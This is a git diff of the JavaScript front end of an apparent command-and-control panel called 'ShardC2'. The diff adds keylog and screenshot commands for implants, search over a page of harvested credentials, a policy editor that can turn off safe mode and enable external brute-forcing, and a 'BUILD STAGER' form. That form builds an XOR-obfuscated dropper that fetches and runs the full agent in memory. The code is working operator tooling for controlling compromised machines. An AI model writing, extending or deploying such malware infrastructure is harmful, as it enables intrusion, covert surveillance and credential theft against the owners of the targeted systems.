@@ -79,6 +79,7 @@ class App {
     const errorEl = document.getElementById('login-error');
     const btn = document.getElementById('login-btn');
     btn.querySelector('.btn-inner').textContent = 'CONNECTING...';
+    btn.querySelector('.btn-arrow').style.display = 'none';
 
     try {
       const resp = await fetch('/api/v1/auth/login', {
@@ -98,7 +99,8 @@ class App {
       this.showApp();
     } catch (e) {
       errorEl.textContent = `[ ERROR ] ${e.message}`;
-      btn.querySelector('.btn-inner').textContent = 'AUTHENTICATE';
+      btn.querySelector('.btn-inner').textContent = 'ACCESS SYSTEM';
+      btn.querySelector('.btn-arrow').style.display = '';
     }
   }
 
@@ -430,9 +432,10 @@ class App {
     }
 
     el.innerHTML = `<div class="table-wrap"><table>
-      <thead><tr><th>ID</th><th>Hostname</th><th>Internal</th><th>External</th><th>Platform</th><th>User</th><th>Priv</th><th>Status</th><th>Last Beacon</th><th>Actions</th></tr></thead>
-      <tbody>${this.bots.map(b => `
-        <tr>
+      <thead><tr><th>ID</th><th>Hostname</th><th>Internal</th><th>External</th><th>Platform</th><th>User</th><th>Priv</th><th>Tags</th><th>Status</th><th>Last Beacon</th><th>Actions</th></tr></thead>
+      <tbody>${this.bots.map(b => {
+        const tags = (b.tags || '').split(',').filter(Boolean);
+        return `<tr>
           <td style="color:var(--red)">${b.id.substring(0, 8)}</td>
           <td style="color:var(--text-bright)">${esc(b.hostname)}</td>
           <td>${esc(b.ip_address)}</td>
@@ -440,13 +443,15 @@ class App {
           <td><span class="os-tag">${osTag(b.os)}</span>${esc(b.architecture)}</td>
           <td>${esc(b.username)}</td>
           <td>${b.privileged ? '<span class="priv-tag">ROOT</span>' : '<span style="color:var(--text-muted)">NO</span>'}</td>
+          <td style="max-width:160px">${tags.length ? tags.map(t => `<span class="bot-chip" style="font-size:0.55rem;padding:0.1rem 0.4rem;cursor:default">${esc(t)}</span>`).join(' ') : '<span style="color:var(--text-muted);font-size:0.65rem;cursor:pointer" onclick="app.editBotTags(\'${escAttr(b.id)}\')">+ tag</span>'}${tags.length && this.canEdit() ? ` <span style="color:var(--text-muted);font-size:0.6rem;cursor:pointer" onclick="app.editBotTags('${escAttr(b.id)}')" title="Edit tags">&#9998;</span>` : ''}</td>
           <td>${statusBadge(b)}</td>
           <td>${timeAgo(b.last_seen)}</td>
           <td>
             ${this.canEdit() ? `<button class="btn-sm" onclick="app.openTerminalForBot('${escAttr(b.id)}')">SHELL</button>
             <button class="btn-sm btn-danger" onclick="app.removeBot('${escAttr(b.id)}')">KILL</button>` : '<span style="color:var(--text-muted)">-</span>'}
           </td>
-        </tr>`).join('')}</tbody></table></div>`;
+        </tr>`;
+      }).join('')}</tbody></table></div>`;
 
     if (this.selectedBotId) this.showBotDetail(this.selectedBotId);
   }
@@ -481,6 +486,48 @@ class App {
     await this.api.del(`/bots/${id}`);
     this.selectedBotId = null;
     this.refreshBots();
+  }
+
+  async editBotTags(id) {
+    const b = this.bots.find(b => b.id === id);
+    if (!b) return;
+    const currentTags = (b.tags || '').split(',').filter(Boolean).join(', ');
+    let allTags = [];
+    try {
+      const data = await this.api.get('/bots/tags');
+      allTags = data.tags || [];
+    } catch (e) {}
+    const panel = document.getElementById('bot-detail-panel');
+    panel.innerHTML = `
+      <div class="bot-detail">
+        <div class="bot-detail-header">
+          <h3>TAGS // ${esc(b.hostname)} [${b.id.substring(0, 8)}]</h3>
+          <button class="btn-sm" onclick="document.getElementById('bot-detail-panel').innerHTML=''">CLOSE</button>
+        </div>
+        <div style="padding:0.8rem">
+          <div style="margin-bottom:0.5rem;font-size:0.7rem;color:var(--text-muted)">Enter tags (comma-separated):</div>
+          <input type="text" id="tag-input" value="${esc(currentTags)}" placeholder="dmz, internal, dc, web-server" style="width:100%;max-width:500px;padding:0.5rem 0.7rem;background:var(--bg-input);border:1px solid var(--border);color:var(--text-primary);font-family:var(--font-mono);font-size:0.8rem;border-radius:4px">
+          ${allTags.length ? `<div style="margin-top:0.5rem;font-size:0.65rem;color:var(--text-muted)">Existing tags: ${allTags.map(t => `<span class="bot-chip" style="font-size:0.55rem;padding:0.1rem 0.4rem;cursor:pointer" onclick="document.getElementById('tag-input').value+=(document.getElementById('tag-input').value?', ':'')+this.textContent">${esc(t)}</span>`).join(' ')}</div>` : ''}
+          <div style="margin-top:0.8rem">
+            <button class="btn-accent" onclick="app.saveBotTags('${escAttr(id)}')">SAVE TAGS</button>
+          </div>
+        </div>
+      </div>`;
+  }
+
+  async saveBotTags(id) {
+    const input = document.getElementById('tag-input');
+    if (!input) return;
+    const tags = input.value.split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
+    try {
+      const result = await this.api.put(`/bots/${id}/tags`, { tags });
+      if (result.error) { this.showToast(result.error, 'error'); return; }
+      this.showToast(`Tags updated: ${tags.join(', ') || 'cleared'}`, 'success');
+      document.getElementById('bot-detail-panel').innerHTML = '';
+      this.refreshBots();
+    } catch (e) {
+      this.showToast('Failed: ' + e.message, 'error');
+    }
   }
 
   openTerminalForBot(id) {
@@ -525,7 +572,7 @@ class App {
         </div>
         <div class="terminal-output" id="term-output"><span class="cmd-system">[*] ShardC2 Remote Shell
 [*] Select a target implant to begin.
-[*] Command types: shell | download | upload | sleep | persist | kill
+[*] Command types: shell | download | upload | sleep | persist | kill | screenshot | keylog
 [*] MULTI mode: send commands to multiple implants at once</span></div>
         ${this.canEdit() ? `<div class="terminal-input-row">
           <span class="terminal-prompt">root@shard:~#</span>
@@ -537,6 +584,8 @@ class App {
             <option value="sleep">SLEEP</option>
             <option value="persist">PERSIST</option>
             <option value="kill">KILL</option>
+            <option value="screenshot">SCREENSHOT</option>
+            <option value="keylog">KEYLOG</option>
           </select>
         </div>` : `<div style="padding:0.8rem 1rem;color:var(--yellow);font-size:0.75rem;letter-spacing:0.1em;border-top:1px solid var(--border)">VIEWER MODE — READ ONLY</div>`}
       </div>`;
@@ -778,6 +827,7 @@ class App {
   // ===== CREDENTIALS =====
   async renderCredentials() {
     this.credFilter = 'all';
+    this.credSearchQuery = '';
     this.allCreds = [];
     const c = document.getElementById('content');
     c.innerHTML = `
@@ -785,9 +835,16 @@ class App {
         <h1 class="page-title">CREDENTIALS</h1>
         <span class="page-tag">HARVESTED</span>
       </div>
-      <div class="actions-bar">
-        <div id="cred-filters" class="bot-chips" style="margin-bottom:0.5rem"></div>
-        <button class="btn-sm" onclick="app.refreshCredentials()">REFRESH</button>
+      <div class="actions-bar" style="flex-wrap:wrap;gap:0.5rem">
+        <div id="cred-filters" class="bot-chips" style="margin-bottom:0"></div>
+        <div style="display:flex;gap:0.5rem;align-items:center;flex:1;min-width:200px">
+          <input type="text" id="cred-search" placeholder="Search username, target, service..." oninput="app.credSearchQuery=this.value;app.renderCredTable()" style="flex:1;max-width:350px;padding:0.4rem 0.7rem;background:var(--bg-input);border:1px solid var(--border);color:var(--text-primary);font-family:var(--font-mono);font-size:0.75rem;border-radius:4px;outline:none">
+          <select id="cred-host-filter" onchange="app.credHostFilter=this.value;app.renderCredTable()" style="padding:0.4rem 0.5rem;background:var(--bg-input);border:1px solid var(--border);color:var(--text-primary);font-family:var(--font-mono);font-size:0.7rem;border-radius:4px">
+            <option value="all">ALL HOSTS</option>
+          </select>
+          <button class="btn-sm" onclick="app.refreshCredentials()">REFRESH</button>
+          <span id="cred-count" style="font-size:0.65rem;color:var(--text-muted)"></span>
+        </div>
       </div>
       <div id="creds-table">
         <div style="padding:1rem"><div class="skeleton-row"><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-xl"></div></div><div class="skeleton-row"><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-xl"></div></div></div>
@@ -829,13 +886,32 @@ class App {
     const data = await this.api.get('/credentials/');
     this.allCreds = data.credentials || [];
     this.renderCredFilters();
+    const hostSelect = document.getElementById('cred-host-filter');
+    if (hostSelect) {
+      const hosts = [...new Set(this.allCreds.map(c => c.target).filter(Boolean))].sort();
+      hostSelect.innerHTML = '<option value="all">ALL HOSTS</option>' + hosts.map(h => `<option value="${escAttr(h)}">${esc(h)}</option>`).join('');
+    }
     this.renderCredTable();
   }
 
   renderCredTable() {
     const el = document.getElementById('creds-table');
     if (!el) return;
-    const creds = this.credFilter === 'all' ? this.allCreds : this.allCreds.filter(c => c.category === this.credFilter);
+    let creds = this.credFilter === 'all' ? this.allCreds : this.allCreds.filter(c => c.category === this.credFilter);
+    if (this.credSearchQuery) {
+      const q = this.credSearchQuery.toLowerCase();
+      creds = creds.filter(c =>
+        (c.username || '').toLowerCase().includes(q) ||
+        (c.target || '').toLowerCase().includes(q) ||
+        (c.service || '').toLowerCase().includes(q) ||
+        (c.source_path || '').toLowerCase().includes(q)
+      );
+    }
+    if (this.credHostFilter && this.credHostFilter !== 'all') {
+      creds = creds.filter(c => c.target === this.credHostFilter);
+    }
+    const countEl = document.getElementById('cred-count');
+    if (countEl) countEl.textContent = `${creds.length}/${this.allCreds.length}`;
 
     if (creds.length === 0) {
       el.innerHTML = '<div class="empty-state"><div class="icon">&#9670;</div><p>NO CREDENTIALS FOUND</p></div>';
@@ -1534,31 +1610,84 @@ class App {
           </div>
         </div>
 
-        <div class="camp-detail">
+        <div class="camp-detail" id="policy-editor-panel">
           <div style="margin-bottom:0.8rem;color:var(--text-muted);font-size:0.7rem;letter-spacing:0.1em">SAFETY POLICY</div>
-          <div class="config-grid">
-            <div class="form-group">
-              <label>Mode</label>
-              <div class="bot-field-value">${info.policy_safe_mode ?
-                '<span class="badge badge-active">SAFE MODE</span>' :
-                '<span class="badge badge-failed">LIVE MODE</span>'}</div>
-            </div>
-            <div class="form-group">
-              <label>External Brute</label>
-              <div class="bot-field-value">${info.external_brute ?
-                '<span class="badge badge-active">ENABLED</span>' :
-                '<span class="badge badge-dead">DISABLED</span>'}</div>
-            </div>
-            <div class="form-group">
-              <label>Auto Deploy</label>
-              <div class="bot-field-value">${info.auto_deploy ?
-                '<span class="badge badge-active">ENABLED</span>' :
-                '<span class="badge badge-dead">DISABLED</span>'}</div>
-            </div>
-          </div>
+          <div style="color:var(--text-muted);font-size:0.65rem;margin-bottom:1rem">Loading policy...</div>
         </div>`;
+      this.loadPolicyEditor();
     } catch (e) {
       el.innerHTML = `<div class="empty-state"><p>Failed to load system info: ${esc(e.message)}</p></div>`;
+    }
+  }
+
+  async loadPolicyEditor() {
+    const el = document.getElementById('policy-editor-panel');
+    if (!el) return;
+    try {
+      const pol = await this.api.get('/policy');
+      el.innerHTML = `
+        <div style="margin-bottom:0.8rem;color:var(--text-muted);font-size:0.7rem;letter-spacing:0.1em">SAFETY POLICY</div>
+        <div class="config-grid">
+          <div class="form-group">
+            <label>Safe Mode</label>
+            <label style="display:flex;align-items:center;gap:0.5rem;cursor:pointer">
+              <input type="checkbox" id="pol-safe-mode" ${pol.safe_mode ? 'checked' : ''} style="accent-color:var(--red)">
+              <span style="font-size:0.75rem;color:var(--text-primary)">${pol.safe_mode ? 'ON' : 'OFF'}</span>
+            </label>
+          </div>
+          <div class="form-group">
+            <label>External Brute</label>
+            <label style="display:flex;align-items:center;gap:0.5rem;cursor:pointer">
+              <input type="checkbox" id="pol-ext-brute" ${pol.allow_external_brute ? 'checked' : ''} style="accent-color:var(--red)">
+              <span style="font-size:0.75rem;color:var(--text-primary)">${pol.allow_external_brute ? 'ENABLED' : 'DISABLED'}</span>
+            </label>
+          </div>
+          <div class="form-group">
+            <label>Auto Deploy</label>
+            <label style="display:flex;align-items:center;gap:0.5rem;cursor:pointer">
+              <input type="checkbox" id="pol-auto-deploy" ${pol.allow_auto_deploy ? 'checked' : ''} style="accent-color:var(--red)">
+              <span style="font-size:0.75rem;color:var(--text-primary)">${pol.allow_auto_deploy ? 'ENABLED' : 'DISABLED'}</span>
+            </label>
+          </div>
+          <div class="form-group" style="grid-column:1/-1">
+            <label>Allowed CIDRs <span style="color:var(--text-muted);font-size:0.6rem">(comma-separated)</span></label>
+            <input type="text" id="pol-allowed-cidrs" value="${(pol.allowed_cidrs || []).join(', ')}" placeholder="10.0.0.0/8, 192.168.0.0/16">
+          </div>
+          <div class="form-group" style="grid-column:1/-1">
+            <label>Allowed Hosts <span style="color:var(--text-muted);font-size:0.6rem">(comma-separated)</span></label>
+            <input type="text" id="pol-allowed-hosts" value="${(pol.allowed_hosts || []).join(', ')}" placeholder="localhost, target.local">
+          </div>
+          <div class="form-group" style="grid-column:1/-1">
+            <label>Blocked CIDRs <span style="color:var(--text-muted);font-size:0.6rem">(comma-separated)</span></label>
+            <input type="text" id="pol-blocked-cidrs" value="${(pol.blocked_cidrs || []).join(', ')}" placeholder="0.0.0.0/0">
+          </div>
+        </div>
+        <div style="margin-top:1rem;display:flex;gap:0.5rem;align-items:center">
+          <button class="btn-accent" onclick="app.savePolicy()">SAVE POLICY</button>
+          <span id="pol-status" style="font-size:0.7rem;color:var(--text-muted)"></span>
+        </div>`;
+    } catch (e) {
+      el.innerHTML = `<div style="color:var(--red);font-size:0.75rem">Failed to load policy: ${esc(e.message)}</div>`;
+    }
+  }
+
+  async savePolicy() {
+    const pol = {
+      safe_mode: document.getElementById('pol-safe-mode').checked,
+      allow_external_brute: document.getElementById('pol-ext-brute').checked,
+      allow_auto_deploy: document.getElementById('pol-auto-deploy').checked,
+      allowed_cidrs: document.getElementById('pol-allowed-cidrs').value.split(',').map(s => s.trim()).filter(Boolean),
+      allowed_hosts: document.getElementById('pol-allowed-hosts').value.split(',').map(s => s.trim()).filter(Boolean),
+      blocked_cidrs: document.getElementById('pol-blocked-cidrs').value.split(',').map(s => s.trim()).filter(Boolean),
+    };
+    try {
+      const result = await this.api.put('/policy', pol);
+      if (result.error) { this.showToast(result.error, 'error'); return; }
+      this.showToast('Policy saved', 'success');
+      const statusEl = document.getElementById('pol-status');
+      if (statusEl) statusEl.innerHTML = '<span style="color:var(--green)">Saved</span>';
+    } catch (e) {
+      this.showToast('Failed: ' + e.message, 'error');
     }
   }
 
@@ -1762,7 +1891,84 @@ class App {
             <div style="color:var(--text-muted);font-size:0.6rem">${p.os}/${p.arch}</div>
           </div>
         `).join('')}
+      </div>
+
+      <div class="camp-detail" style="margin-top:1rem">
+        <div style="margin-bottom:1rem;color:var(--text-muted);font-size:0.7rem;letter-spacing:0.1em">BUILD STAGER</div>
+        <div style="color:var(--text-secondary);font-size:0.7rem;margin-bottom:1rem">
+          Lightweight dropper that fetches and executes a full agent from C2 in memory. No hardcoded config on disk.
+        </div>
+        <div class="config-grid">
+          <div class="form-group">
+            <label>Stage Agent Build ID</label>
+            <input type="text" id="stager-stage-id" placeholder="paste completed build ID">
+          </div>
+          <div class="form-group">
+            <label>C2 Server URL</label>
+            <input type="text" id="stager-server-url" placeholder="http://10.0.0.5:8443" value="${location.origin}">
+          </div>
+          <div class="form-group">
+            <label>Target OS</label>
+            <select id="stager-goos">
+              <option value="linux">LINUX</option>
+              <option value="darwin">MACOS</option>
+              <option value="windows">WINDOWS</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Architecture</label>
+            <select id="stager-goarch">
+              <option value="amd64">AMD64</option>
+              <option value="arm64">ARM64</option>
+              <option value="arm">ARM</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>XOR Key <span style="color:var(--text-muted);font-size:0.6rem">(optional hex, e.g. deadbeef)</span></label>
+            <input type="text" id="stager-xor" placeholder="optional">
+          </div>
+        </div>
+        <div style="margin-top:1rem;display:flex;gap:0.5rem;align-items:center">
+          <button class="btn-accent" onclick="app.buildStager()" id="stager-btn">BUILD STAGER</button>
+          <span id="stager-status" style="font-size:0.7rem;color:var(--text-muted)"></span>
+        </div>
       </div>`;
+  }
+
+  async buildStager() {
+    const btn = document.getElementById('stager-btn');
+    const status = document.getElementById('stager-status');
+    const stageId = document.getElementById('stager-stage-id').value.trim();
+    const serverUrl = document.getElementById('stager-server-url').value.trim();
+    const goos = document.getElementById('stager-goos').value;
+    const goarch = document.getElementById('stager-goarch').value;
+    const xorKey = document.getElementById('stager-xor').value.trim();
+
+    if (!stageId) { this.showToast('Stage Agent Build ID required', 'warning'); return; }
+    if (!serverUrl) { this.showToast('C2 Server URL required', 'warning'); return; }
+
+    btn.disabled = true;
+    btn.textContent = 'BUILDING...';
+    status.textContent = '';
+
+    try {
+      const result = await this.api.post('/builds/stager', {
+        goos, goarch, stage_id: stageId, server_url: serverUrl,
+        implant_key: '', xor_key: xorKey,
+      });
+      if (result.error) {
+        this.showToast('Stager build failed: ' + result.error, 'error');
+        btn.disabled = false;
+        btn.textContent = 'BUILD STAGER';
+        return;
+      }
+      status.innerHTML = `<span style="color:var(--yellow)">Building stager ${goos}/${goarch}...</span>`;
+      this.pollBuild(result.id, btn, status);
+    } catch (e) {
+      this.showToast('Stager build failed: ' + e.message, 'error');
+      btn.disabled = false;
+      btn.textContent = 'BUILD STAGER';
+    }
   }
 
   async buildAgent() {
@@ -2157,5 +2363,65 @@ function osTag(os) {
   if (o.includes('darwin') || o.includes('mac')) return 'MAC';
   return '???';
 }
+
+// Login grid animation
+(function initLoginGrid() {
+  const canvas = document.getElementById('login-grid');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+  let w, h, cols, rows, dots;
+  const spacing = 40;
+  const mouse = { x: -1000, y: -1000 };
+
+  function resize() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+    cols = Math.ceil(w / spacing) + 1;
+    rows = Math.ceil(h / spacing) + 1;
+    dots = [];
+    for (let r = 0; r < rows; r++) {
+      for (let c = 0; c < cols; c++) {
+        dots.push({ x: c * spacing, y: r * spacing, baseX: c * spacing, baseY: r * spacing });
+      }
+    }
+  }
+
+  window.addEventListener('resize', resize);
+  document.getElementById('login-screen').addEventListener('mousemove', e => {
+    mouse.x = e.clientX; mouse.y = e.clientY;
+  });
+  document.getElementById('login-screen').addEventListener('mouseleave', () => {
+    mouse.x = -1000; mouse.y = -1000;
+  });
+
+  function draw() {
+    if (document.getElementById('login-screen').style.display === 'none') return;
+    ctx.clearRect(0, 0, w, h);
+    for (const dot of dots) {
+      const dx = mouse.x - dot.baseX;
+      const dy = mouse.y - dot.baseY;
+      const dist = Math.sqrt(dx * dx + dy * dy);
+      const maxDist = 150;
+      if (dist < maxDist) {
+        const force = (1 - dist / maxDist) * 8;
+        dot.x = dot.baseX + (dx / dist) * force;
+        dot.y = dot.baseY + (dy / dist) * force;
+      } else {
+        dot.x += (dot.baseX - dot.x) * 0.1;
+        dot.y += (dot.baseY - dot.y) * 0.1;
+      }
+      const proximity = dist < maxDist ? 0.15 + (1 - dist / maxDist) * 0.5 : 0.08;
+      const r = dist < maxDist ? 1.2 + (1 - dist / maxDist) * 1.5 : 1;
+      ctx.beginPath();
+      ctx.arc(dot.x, dot.y, r, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(220, 38, 38, ${proximity})`;
+      ctx.fill();
+    }
+    requestAnimationFrame(draw);
+  }
+
+  resize();
+  draw();
+})();
 
 const app = new App();
